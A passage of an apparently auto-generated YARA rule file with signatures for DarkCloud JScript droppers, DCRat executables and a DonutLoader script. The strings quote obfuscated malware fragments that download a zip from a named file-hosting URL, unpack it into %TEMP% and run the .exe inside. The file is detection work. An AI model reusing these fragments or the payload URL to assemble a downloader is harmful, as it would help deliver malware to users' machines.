      hash1 = "f7c011b039d9220e52d4beb69258245ee6c5a554d90e587e0ac3e2225a35984e"
   strings:
      $x1 = "function a(){var x=['Scripting.FileSystemObject','Sleep','0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ','Delet" ascii /* score: '34.00'*/
      $s2 = "Shell','2907KUudHj','CreateFolder','34545320CylMcJ','random','%TEMP%','ADODB.Stream','MSXML2.XMLHTTP','Open','open','charAt','at" ascii /* score: '28.00'*/
      $s3 = ",'moveNext','GET','NameSpace','status','GetFolder','floor','Write','https://files.catbox.moe/1vvqum.zip','.zip','201232CBdcLc','" ascii /* score: '11.00'*/
      $s4 = "xa3)){var q=d[w(0x80)](n,j(0x7)+'.exe');p[w(0xa0)](q),p[w(0x99)](),c[w(0x87)]('\\x22'+q+'\\x22',0x1,![]);break;}o[w(0xa4)]();}}t" ascii /* score: '11.00'*/
      $s5 = "0f),(function(){var s=b,c=WScript[s(0x86)](s(0x89)),d=WScript[s(0x86)](s(0x96)),f=c[s(0x9d)](s(0x8e)),g=s(0xab),h=d[s(0x80)](f,j" ascii /* score: '10.00'*/
      $s6 = "w Enumerator(d[w(0xa8)](n)['Files']);while(!o[w(0x94)]()){var p=o['item']();if(d['GetExtensionName'](p['Name'])[w(0x83)]()===w(0" ascii /* score: '9.00'*/
      $s7 = "0x85)](o,0x2),q['Close'](),!![];}function l(n,o){var v=s,p=WScript['CreateObject']('Shell.Application'),q=p[v(0xa6)](n);if(!q)re" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 6KB and
      1 of ($x*) and all of them
}

rule DarkCloud_signature__4 {
   meta:
      description = "_subset_batch - file DarkCloud(signature).tar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9497c23a06230ed9a98b372c86d017e4c24f5ada529b4e7e567805758174e577"
   strings:
      $x1 = "function b(c,d){var e=a();return b=function(f,g){f=f-0x1d6;var h=e[f];return h;},b(c,d);}(function(c,d){var v=b,e=c();while(!![]" ascii /* score: '34.00'*/
      $s2 = ",'Files','status','Open','2488308DQiPLx','ExpandEnvironmentStrings','%TEMP%','GET','MSXML2.XMLHTTP','Scripting.FileSystemObject'" ascii /* score: '29.00'*/
      $s3 = ",'SaveToFile','item','send','GetExtensionName','Run','13002536wAjzDt','9635255zqIHbY','responseBody','Sleep','Copy','FolderExist" ascii /* score: '12.00'*/
      $s4 = "r m=d('WScript.Shell'),n=d(w(0x1da)),o=e(m),p=w(0x1ec),q=h(0x6)+w(0x1f2),r=h(0x6),s=f(n,o,q),t=f(n,o,r);i(p,s)&&(j(n,s,t)&&(g(0x" ascii /* score: '12.00'*/
      $s5 = "rator(p[C(0x1f7)]);for(;!q[C(0x1f4)]();q['moveNext']()){var r=q[C(0x1dc)]();if(l(m,r['Name'])){var s=h(0x7)+'.exe',t=f(m,o,s);r[" ascii /* score: '11.00'*/
      $s6 = "0000002" ascii /* reversed goodware string '2000000' */ /* score: '11.00'*/
      $s7 = "}function f(m,n,o){return m['BuildPath'](n,o);}function g(m){var y=b;WScript[y(0x1e3)](m);}function h(m){var z=b,n='0123456789ab" ascii /* score: '10.00'*/
      $s8 = "o);var r=p['NameSpace'](o);return r[B(0x1ed)](q['Items'](),0x14),!![];}function k(m,n,o){var C=b,p=m['GetFolder'](o),q=new Enume" ascii /* score: '9.00'*/
      $s9 = "]);o+=n['charAt'](q);}return o;}function i(m,n){var A=b,o=d(A(0x1d9));o['open'](A(0x1d8),m,![]),o[A(0x1dd)]();if(o[A(0x1f8)]!==0" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x3832 and filesize < 30KB and
      1 of ($x*) and all of them
}

rule DarkCloud_signature__1af845db {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_1af845db.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1af845db54d81941c702d7e25d4b7a278140abb8e53dc6f61569e233fa403787"
   strings:
      $x1 = "function b(c,d){var e=a();return b=function(f,g){f=f-0x1d6;var h=e[f];return h;},b(c,d);}(function(c,d){var v=b,e=c();while(!![]" ascii /* score: '34.00'*/
      $s2 = ",'Files','status','Open','2488308DQiPLx','ExpandEnvironmentStrings','%TEMP%','GET','MSXML2.XMLHTTP','Scripting.FileSystemObject'" ascii /* score: '29.00'*/
      $s3 = ",'SaveToFile','item','send','GetExtensionName','Run','13002536wAjzDt','9635255zqIHbY','responseBody','Sleep','Copy','FolderExist" ascii /* score: '12.00'*/
      $s4 = "r m=d('WScript.Shell'),n=d(w(0x1da)),o=e(m),p=w(0x1ec),q=h(0x6)+w(0x1f2),r=h(0x6),s=f(n,o,q),t=f(n,o,r);i(p,s)&&(j(n,s,t)&&(g(0x" ascii /* score: '12.00'*/
      $s5 = "rator(p[C(0x1f7)]);for(;!q[C(0x1f4)]();q['moveNext']()){var r=q[C(0x1dc)]();if(l(m,r['Name'])){var s=h(0x7)+'.exe',t=f(m,o,s);r[" ascii /* score: '11.00'*/
      $s6 = "}function f(m,n,o){return m['BuildPath'](n,o);}function g(m){var y=b;WScript[y(0x1e3)](m);}function h(m){var z=b,n='0123456789ab" ascii /* score: '10.00'*/
      $s7 = "o);var r=p['NameSpace'](o);return r[B(0x1ed)](q['Items'](),0x14),!![];}function k(m,n,o){var C=b,p=m['GetFolder'](o),q=new Enume" ascii /* score: '9.00'*/
      $s8 = "]);o+=n['charAt'](q);}return o;}function i(m,n){var A=b,o=d(A(0x1d9));o['open'](A(0x1d8),m,![]),o[A(0x1dd)]();if(o[A(0x1f8)]!==0" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 6KB and
      1 of ($x*) and all of them
}

rule DarkCloud_signature__cd508636 {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_cd508636.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "cd508636a2754d9018d8dc11f2d9daa2056e7a2a060d0acfa6dab4f5bdc50864"
   strings:
      $x1 = "function b(c,d){var e=a();return b=function(f,g){f=f-0x1d6;var h=e[f];return h;},b(c,d);}(function(c,d){var v=b,e=c();while(!![]" ascii /* score: '34.00'*/
      $s2 = ",'Files','status','Open','2488308DQiPLx','ExpandEnvironmentStrings','%TEMP%','GET','MSXML2.XMLHTTP','Scripting.FileSystemObject'" ascii /* score: '29.00'*/
      $s3 = ",'SaveToFile','item','send','GetExtensionName','Run','13002536wAjzDt','9635255zqIHbY','responseBody','Sleep','Copy','FolderExist" ascii /* score: '12.00'*/
      $s4 = "r m=d('WScript.Shell'),n=d(w(0x1da)),o=e(m),p=w(0x1ec),q=h(0x6)+w(0x1f2),r=h(0x6),s=f(n,o,q),t=f(n,o,r);i(p,s)&&(j(n,s,t)&&(g(0x" ascii /* score: '12.00'*/
      $s5 = "rator(p[C(0x1f7)]);for(;!q[C(0x1f4)]();q['moveNext']()){var r=q[C(0x1dc)]();if(l(m,r['Name'])){var s=h(0x7)+'.exe',t=f(m,o,s);r[" ascii /* score: '11.00'*/
      $s6 = "}function f(m,n,o){return m['BuildPath'](n,o);}function g(m){var y=b;WScript[y(0x1e3)](m);}function h(m){var z=b,n='0123456789ab" ascii /* score: '10.00'*/
      $s7 = "o);var r=p['NameSpace'](o);return r[B(0x1ed)](q['Items'](),0x14),!![];}function k(m,n,o){var C=b,p=m['GetFolder'](o),q=new Enume" ascii /* score: '9.00'*/
      $s8 = "]);o+=n['charAt'](q);}return o;}function i(m,n){var A=b,o=d(A(0x1d9));o['open'](A(0x1d8),m,![]),o[A(0x1dd)]();if(o[A(0x1f8)]!==0" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 6KB and
      1 of ($x*) and all of them
}

rule DarkCloud_signature__9006cc5e {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_9006cc5e.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9006cc5eb7a7a1603689b4ef7f0ea26dd5c98075f77192db959aed5c20ec7434"
   strings:
      $x1 = "(function(c,d){var r=b,e=c();while(!![]){try{var f=-parseInt(r(0x17e))/0x1+-parseInt(r(0x181))/0x2*(-parseInt(r(0x18a))/0x3)+-pa" ascii /* score: '34.00'*/
      $s2 = "GetExtensionName','toLowerCase','Type','FolderExists','exe','Files','%TEMP%','NameSpace','random','charAt','Open','status','open" ascii /* score: '21.00'*/
      $s3 = "49064Ycjyem','CreateFolder','Delete','WScript.Shell','Close','floor','50182FNAkqT','2618799hZnrYM','MSXML2.XMLHTTP'];a=function(" ascii /* score: '15.00'*/
      $s4 = "()){var p=o[w(0x180)]();if(d[w(0x1a0)](p['Name'])[w(0x1a1)]()===w(0x1a4)){var q=d[w(0x194)](n,j(0x7)+'.exe');p['Copy'](q),p[w(0x" ascii /* score: '11.00'*/
      $s5 = "rings','BuildPath','atEnd','7TjESAG','7195602waVXpl','5JYolME','Run','Items','.zip','CopyHere','Sleep','7870rrwQRo','moveNext','" ascii /* score: '10.00'*/
      $s6 = "shift']());}}}(a,0xf19a3),(function(){var s=b,c=WScript[s(0x182)](s(0x186)),d=WScript['CreateObject']('Scripting.FileSystemObjec" ascii /* score: '10.00'*/
      $s7 = "ew ActiveXObject(u(0x18b));p[u(0x17c)]('GET',n,![]),p[u(0x18d)]();if(p[u(0x1ab)]!==0xc8)return![];var q=new ActiveXObject(u(0x18" ascii /* score: '9.00'*/
      $s8 = ")](o)[v(0x19c)](q[v(0x19a)](),0x14),!![];}function m(n){var w=s,o=new Enumerator(d['GetFolder'](n)[w(0x1a5)]);while(!o[w(0x195)]" ascii /* score: '9.00'*/
      $s9 = ",p=WScript[v(0x182)]('Shell.Application'),q=p['NameSpace'](n);if(!q)return![];if(!d[v(0x1a3)](o))d[v(0x184)](o);return p[v(0x1a7" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 6KB and
      1 of ($x*) and all of them
}

rule DarkCloud_signature__a5ae6f88 {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_a5ae6f88.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a5ae6f88693185bf43485f8d5f6cb0bdb999beec09ac32c09e3157c11000f881"
   strings:
      $x1 = "(function(c,d){var r=b,e=c();while(!![]){try{var f=-parseInt(r(0x17e))/0x1+-parseInt(r(0x181))/0x2*(-parseInt(r(0x18a))/0x3)+-pa" ascii /* score: '34.00'*/
      $s2 = "GetExtensionName','toLowerCase','Type','FolderExists','exe','Files','%TEMP%','NameSpace','random','charAt','Open','status','open" ascii /* score: '21.00'*/
      $s3 = "49064Ycjyem','CreateFolder','Delete','WScript.Shell','Close','floor','50182FNAkqT','2618799hZnrYM','MSXML2.XMLHTTP'];a=function(" ascii /* score: '15.00'*/
      $s4 = "()){var p=o[w(0x180)]();if(d[w(0x1a0)](p['Name'])[w(0x1a1)]()===w(0x1a4)){var q=d[w(0x194)](n,j(0x7)+'.exe');p['Copy'](q),p[w(0x" ascii /* score: '11.00'*/
      $s5 = "rings','BuildPath','atEnd','7TjESAG','7195602waVXpl','5JYolME','Run','Items','.zip','CopyHere','Sleep','7870rrwQRo','moveNext','" ascii /* score: '10.00'*/
      $s6 = "shift']());}}}(a,0xf19a3),(function(){var s=b,c=WScript[s(0x182)](s(0x186)),d=WScript['CreateObject']('Scripting.FileSystemObjec" ascii /* score: '10.00'*/
      $s7 = "ew ActiveXObject(u(0x18b));p[u(0x17c)]('GET',n,![]),p[u(0x18d)]();if(p[u(0x1ab)]!==0xc8)return![];var q=new ActiveXObject(u(0x18" ascii /* score: '9.00'*/
      $s8 = ")](o)[v(0x19c)](q[v(0x19a)](),0x14),!![];}function m(n){var w=s,o=new Enumerator(d['GetFolder'](n)[w(0x1a5)]);while(!o[w(0x195)]" ascii /* score: '9.00'*/
      $s9 = ",p=WScript[v(0x182)]('Shell.Application'),q=p['NameSpace'](n);if(!q)return![];if(!d[v(0x1a3)](o))d[v(0x184)](o);return p[v(0x1a7" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 6KB and
      1 of ($x*) and all of them
}

rule DarkCloud_signature__c254063e {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_c254063e.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c254063ecfe1ea97e155e865c31843e6c39629047c61d94aed16f484b6e9c0e1"
   strings:
      $x1 = "(function(c,d){var r=b,e=c();while(!![]){try{var f=-parseInt(r(0x17e))/0x1+-parseInt(r(0x181))/0x2*(-parseInt(r(0x18a))/0x3)+-pa" ascii /* score: '34.00'*/
      $s2 = "GetExtensionName','toLowerCase','Type','FolderExists','exe','Files','%TEMP%','NameSpace','random','charAt','Open','status','open" ascii /* score: '21.00'*/
      $s3 = "49064Ycjyem','CreateFolder','Delete','WScript.Shell','Close','floor','50182FNAkqT','2618799hZnrYM','MSXML2.XMLHTTP'];a=function(" ascii /* score: '15.00'*/
      $s4 = "()){var p=o[w(0x180)]();if(d[w(0x1a0)](p['Name'])[w(0x1a1)]()===w(0x1a4)){var q=d[w(0x194)](n,j(0x7)+'.exe');p['Copy'](q),p[w(0x" ascii /* score: '11.00'*/
      $s5 = "rings','BuildPath','atEnd','7TjESAG','7195602waVXpl','5JYolME','Run','Items','.zip','CopyHere','Sleep','7870rrwQRo','moveNext','" ascii /* score: '10.00'*/
      $s6 = "shift']());}}}(a,0xf19a3),(function(){var s=b,c=WScript[s(0x182)](s(0x186)),d=WScript['CreateObject']('Scripting.FileSystemObjec" ascii /* score: '10.00'*/
      $s7 = "ew ActiveXObject(u(0x18b));p[u(0x17c)]('GET',n,![]),p[u(0x18d)]();if(p[u(0x1ab)]!==0xc8)return![];var q=new ActiveXObject(u(0x18" ascii /* score: '9.00'*/
      $s8 = ")](o)[v(0x19c)](q[v(0x19a)](),0x14),!![];}function m(n){var w=s,o=new Enumerator(d['GetFolder'](n)[w(0x1a5)]);while(!o[w(0x195)]" ascii /* score: '9.00'*/
      $s9 = ",p=WScript[v(0x182)]('Shell.Application'),q=p['NameSpace'](n);if(!q)return![];if(!d[v(0x1a3)](o))d[v(0x184)](o);return p[v(0x1a7" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 6KB and
      1 of ($x*) and all of them
}

rule DarkCloud_signature__d0a2d241 {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_d0a2d241.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d0a2d2411e911b865fbaa5c02caf86627f05b9e2495059b75925bdbfbfeca100"
   strings:
      $x1 = "(function(c,d){var r=b,e=c();while(!![]){try{var f=-parseInt(r(0x17e))/0x1+-parseInt(r(0x181))/0x2*(-parseInt(r(0x18a))/0x3)+-pa" ascii /* score: '34.00'*/
      $s2 = "GetExtensionName','toLowerCase','Type','FolderExists','exe','Files','%TEMP%','NameSpace','random','charAt','Open','status','open" ascii /* score: '21.00'*/
      $s3 = "49064Ycjyem','CreateFolder','Delete','WScript.Shell','Close','floor','50182FNAkqT','2618799hZnrYM','MSXML2.XMLHTTP'];a=function(" ascii /* score: '15.00'*/
      $s4 = "()){var p=o[w(0x180)]();if(d[w(0x1a0)](p['Name'])[w(0x1a1)]()===w(0x1a4)){var q=d[w(0x194)](n,j(0x7)+'.exe');p['Copy'](q),p[w(0x" ascii /* score: '11.00'*/
      $s5 = "rings','BuildPath','atEnd','7TjESAG','7195602waVXpl','5JYolME','Run','Items','.zip','CopyHere','Sleep','7870rrwQRo','moveNext','" ascii /* score: '10.00'*/
      $s6 = "shift']());}}}(a,0xf19a3),(function(){var s=b,c=WScript[s(0x182)](s(0x186)),d=WScript['CreateObject']('Scripting.FileSystemObjec" ascii /* score: '10.00'*/
      $s7 = "ew ActiveXObject(u(0x18b));p[u(0x17c)]('GET',n,![]),p[u(0x18d)]();if(p[u(0x1ab)]!==0xc8)return![];var q=new ActiveXObject(u(0x18" ascii /* score: '9.00'*/
      $s8 = ")](o)[v(0x19c)](q[v(0x19a)](),0x14),!![];}function m(n){var w=s,o=new Enumerator(d['GetFolder'](n)[w(0x1a5)]);while(!o[w(0x195)]" ascii /* score: '9.00'*/
      $s9 = ",p=WScript[v(0x182)]('Shell.Application'),q=p['NameSpace'](n);if(!q)return![];if(!d[v(0x1a3)](o))d[v(0x184)](o);return p[v(0x1a7" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 6KB and
      1 of ($x*) and all of them
}

rule DarkCloud_signature__9f6746b8 {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_9f6746b8.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9f6746b8ac8ad681459af2dc9f3c3d81b835883ead197d162788b49615d861ed"
   strings:
      $x1 = "%TEMP%','WScript.Shell','352DvWChP','.exe','5REvscD','Run','random','CreateObject','8066639USNlrq','258492phaMwY','charAt','ADOD" ascii /* score: '35.00'*/
      $x2 = "function b(c,d){var e=a();return b=function(f,g){f=f-0x149;var h=e[f];return h;},b(c,d);}function a(){var F=['GetFolder','Items'" ascii /* score: '34.00'*/
      $s3 = "B.Stream','NameSpace','Open','10369752WnRWAl','Scripting.FileSystemObject','GET','CopyHere','6493698hCTDxZ','Shell.Application'," ascii /* score: '13.00'*/
      $s4 = "m);}function e(m){var y=b;return m[y(0x154)](y(0x164));}function f(m,n,o){var z=b;return m[z(0x150)](n,o);}function g(m){WScript" ascii /* score: '10.00'*/
      $s5 = "function b(c,d){var e=a();return b=function(f,g){f=f-0x149;var h=e[f];return h;},b(c,d);}function a(){var F=['GetFolder','Items'" ascii /* score: '9.00'*/
      $s6 = "return m['GetExtensionName'](n)[E(0x14a)]()==='exe';}c();}()));" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 7KB and
      1 of ($x*) and all of them
}

rule DarkCloud_signature__e72c5db2 {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_e72c5db2.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e72c5db2a50c37f1c448d3512e61b1eab148d821eee5ac3fd4b7c26901e58335"
   strings:
      $x1 = "%TEMP%','WScript.Shell','352DvWChP','.exe','5REvscD','Run','random','CreateObject','8066639USNlrq','258492phaMwY','charAt','ADOD" ascii /* score: '35.00'*/
      $x2 = "function b(c,d){var e=a();return b=function(f,g){f=f-0x149;var h=e[f];return h;},b(c,d);}function a(){var F=['GetFolder','Items'" ascii /* score: '34.00'*/
      $s3 = "B.Stream','NameSpace','Open','10369752WnRWAl','Scripting.FileSystemObject','GET','CopyHere','6493698hCTDxZ','Shell.Application'," ascii /* score: '13.00'*/
      $s4 = "m);}function e(m){var y=b;return m[y(0x154)](y(0x164));}function f(m,n,o){var z=b;return m[z(0x150)](n,o);}function g(m){WScript" ascii /* score: '10.00'*/
      $s5 = "function b(c,d){var e=a();return b=function(f,g){f=f-0x149;var h=e[f];return h;},b(c,d);}function a(){var F=['GetFolder','Items'" ascii /* score: '9.00'*/
      $s6 = "return m['GetExtensionName'](n)[E(0x14a)]()==='exe';}c();}()));" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 7KB and
      1 of ($x*) and all of them
}

rule DCRat_signature__3 {
   meta:
      description = "_subset_batch - file DCRat(signature).7z"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3a3dbefd6eee76b987b7b541367e899840d10e0f553dbd7f41969675a36f0b92"
   strings:
      $s1 = "* Zum]" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x7a37 and filesize < 4000KB and
      all of them
}

rule DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ad169a35a2146aa724f0d1c3bf889afcf2aca3ddd346c675877c3f5d17ef75c9"
   strings:
      $s1 = "Ji3w8I6LCPiC7PFl4lx.YH0P0f6KAXNsAuDobj5+iB5YOA6mJ9r0Pcvj11u+NoHUWp6dpCknWg7EJen`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '24.00'*/
      $s2 = "Ji3w8I6LCPiC7PFl4lx.YH0P0f6KAXNsAuDobj5+iB5YOA6mJ9r0Pcvj11u+NoHUWp6dpCknWg7EJen`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '15.00'*/
      $s3 = "VovSlOGVo1" fullword ascii /* score: '10.00'*/
      $s4 = "h3WEAjdLlXgEI9SGIiA" fullword ascii /* score: '9.00'*/
      $s5 = "hfTPCg1xsVSLcEBlDB3" fullword ascii /* score: '9.00'*/
      $s6 = "gvcXB7SpypECt4HM0Gk" fullword ascii /* score: '9.00'*/
      $s7 = "bIbWcb6GloGFdU7l6Jw" fullword ascii /* score: '9.00'*/
      $s8 = "LqVSDVYRkdstdelgetk" fullword ascii /* score: '9.00'*/
      $s9 = "rViRCKnmyaB99YtQUS6" fullword ascii /* score: '9.00'*/
      $s10 = "Y9quDbd5irc1uJCytYV" fullword ascii /* score: '9.00'*/
      $s11 = "KLRvz2IrCv" fullword ascii /* score: '9.00'*/
      $s12 = "RBKPIRCvV" fullword ascii /* score: '9.00'*/
      $s13 = "RdllYx9g0aGmbbw8tw1" fullword ascii /* score: '9.00'*/
      $s14 = "iDLLfAeN9HpRgayGAY" fullword ascii /* score: '9.00'*/
      $s15 = "eel0NpYYSpYffd62l2I" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}

rule DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__10451438 {
   meta:
      description = "_subset_batch - file DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_10451438.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "10451438e7f98f5044d039e581ba74b1b8b41726415df54fa3560c01c5589828"
   strings:
      $s1 = "zl9ZADuorTnQsMJe50K.rTRw9iuqy4Sh7Aw87LE+NMK5fbuWnO4ClOCvkCB+jthVIsuyCnFKTDOeCvM`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '27.00'*/
      $s2 = "zl9ZADuorTnQsMJe50K.rTRw9iuqy4Sh7Aw87LE+NMK5fbuWnO4ClOCvkCB+jthVIsuyCnFKTDOeCvM`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '18.00'*/
      $s3 = "QHdDKSIlec" fullword ascii /* base64 encoded string '@wC)"%y' */ /* score: '14.00'*/
      $s4 = "dC05RjJBJ5" fullword ascii /* base64 encoded string 't-9F2A'' */ /* score: '11.00'*/
      $s5 = "jspyrOZK7D" fullword ascii /* score: '9.00'*/
      $s6 = "jcD7uHlsPYiKGaUDlVh" fullword ascii /* score: '9.00'*/
      $s7 = "svXMNOVh6uIRCp2fIuy" fullword ascii /* score: '9.00'*/
      $s8 = "MpviSpY2LU" fullword ascii /* score: '9.00'*/
      $s9 = "r20j7MnfiwKQh93LEYE" fullword ascii /* score: '9.00'*/
      $s10 = "vk3Eyevhpg9elPOY1kp" fullword ascii /* score: '9.00'*/
      $s11 = "QeyeYeAWRwq7lkWD6Zi" fullword ascii /* score: '9.00'*/
      $s12 = "IrCQBdo0W1YNwsdi5ry" fullword ascii /* score: '9.00'*/
      $s13 = "c4so8dLLtZR1OPpAAMY" fullword ascii /* score: '9.00'*/
      $s14 = "lOgEQJZVoTSMUHOqEgJ" fullword ascii /* score: '9.00'*/
      $s15 = "jDLLO8Hsdf" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__691b848e {
   meta:
      description = "_subset_batch - file DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_691b848e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "691b848ee52144679b2e7f5ee491df5715bb2d957aefeb0ca8f23a61314e8b26"
   strings:
      $s1 = "AT2RLo6DvWLALxYfdf1.w4KkPS6HbA6F8Y2VYsk+KZQvVu60kT4vkYkXvNO+T8xQva6RxSnPHdGRekr`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '24.00'*/
      $s2 = "AT2RLo6DvWLALxYfdf1.w4KkPS6HbA6F8Y2VYsk+KZQvVu60kT4vkYkXvNO+T8xQva6RxSnPHdGRekr`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '15.00'*/
      $s3 = "IWtEUUl0TJ" fullword ascii /* base64 encoded string '!kDQItL' */ /* score: '14.00'*/
      $s4 = "S21ycCZPJZ" fullword ascii /* base64 encoded string 'Kmrp&O%' */ /* score: '14.00'*/
      $s5 = "PlEwV1k3Sv" fullword ascii /* base64 encoded string '>Q0WY7J' */ /* score: '14.00'*/
      $s6 = "YiNuJEZAWp" fullword ascii /* base64 encoded string 'b#n$F@Z' */ /* score: '14.00'*/
      $s7 = "LSB3OVBLM6" fullword ascii /* base64 encoded string '- w9PK3' */ /* score: '11.00'*/
      $s8 = "XlQ3WGwlbr" fullword ascii /* base64 encoded string '^T7Xl%n' */ /* score: '11.00'*/
      $s9 = "Om0N0PTemPMv3B4yWn6" fullword ascii /* score: '11.00'*/
      $s10 = "u56ircqxRTExx4Mo9px" fullword ascii /* score: '9.00'*/
      $s11 = "lanVDLPN6FTpYOa7KIC" fullword ascii /* score: '9.00'*/
      $s12 = "nsDMCpm6sSpYupgSwQs" fullword ascii /* score: '9.00'*/
      $s13 = "JhRyDLlLAs" fullword ascii /* score: '9.00'*/
      $s14 = "ELOgL7Fs7alxE0Fo5wg" fullword ascii /* score: '9.00'*/
      $s15 = "U0PpnOFTpOkn5DIlsrV" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__586d9226 {
   meta:
      description = "_subset_batch - file DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_586d9226.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "586d92264dce3a37f53f391dbd3c20fbb8b579667923b212921300d390f86b6b"
   strings:
      $s1 = "rZqFdDXwuLOpSobaKli.nnBv2CX8weEqDvgINeS+gtK5kUXmZW1Umoxx9id+KmcHg9XtAtFtI8cWbjK`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '27.00'*/
      $s2 = "rZqFdDXwuLOpSobaKli.nnBv2CX8weEqDvgINeS+gtK5kUXmZW1Umoxx9id+KmcHg9XtAtFtI8cWbjK`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '18.00'*/
      $s3 = "rICxLPj9t" fullword ascii /* base64 encoded string ' ,K>?m' */ /* score: '14.00'*/
      $s4 = "SjEAUG48eH" fullword ascii /* base64 encoded string 'J1 Pn<x' */ /* score: '14.00'*/
      $s5 = "NHtYYVogPe" fullword ascii /* base64 encoded string '4{XaZ =' */ /* score: '14.00'*/
      $s6 = "JlVNciAqYq" fullword ascii /* base64 encoded string '&UMr *b' */ /* score: '14.00'*/
      $s7 = "alkmV015q" fullword ascii /* base64 encoded string 'jY&WMy' */ /* score: '14.00'*/
      $s8 = "JyFDTGFjdk" fullword ascii /* base64 encoded string ''!CLacv' */ /* score: '14.00'*/
      $s9 = "YcWZRQ09x" fullword ascii /* base64 encoded string 'qfQCOq' */ /* score: '14.00'*/
      $s10 = "RTsAY1haZ" fullword ascii /* base64 encoded string 'E; cXZ' */ /* score: '14.00'*/
      $s11 = "di9Fc19NNO" fullword ascii /* base64 encoded string 'v/Es_M4' */ /* score: '11.00'*/
      $s12 = "asoSpy7Oplj1sOpGv92" fullword ascii /* score: '9.00'*/
      $s13 = "pExjlwKrtTtvbj1eEYE" fullword ascii /* score: '9.00'*/
      $s14 = "lhGEm8Z6eYEB9rZNUBk" fullword ascii /* score: '9.00'*/
      $s15 = "UMFF7Pp0c6" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}

rule dd5dd4d085ba9166cfdb77228c0d1a84930a51a9e1e684dd6366130e578170f4_dd5dd4d0 {
   meta:
      description = "_subset_batch - file dd5dd4d085ba9166cfdb77228c0d1a84930a51a9e1e684dd6366130e578170f4_dd5dd4d0.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "dd5dd4d085ba9166cfdb77228c0d1a84930a51a9e1e684dd6366130e578170f4"
   strings:
      $s1 = "b3ce10cc997cd60a48a01677a152e21d4aa36ab5b2fd3718c04edef62662cea1.jpg" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 3000KB and
      all of them
}

rule DonutLoader_signature__2 {
   meta:
      description = "_subset_batch - file DonutLoader(signature).js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "5cdadc22e3fab3ad5af3c4baf733e2faec61191f933867013d0c5883c1833b35"
   strings:
      $x1 = "var _0x5dcdd4=_0x1d03;(function(_0x5f0774,_0xc0c62a){var _0x29ac39=_0x1d03,_0x3de697=_0x5f0774();while(!![]){try{var _0x59eff1=p" ascii /* score: '31.00'*/
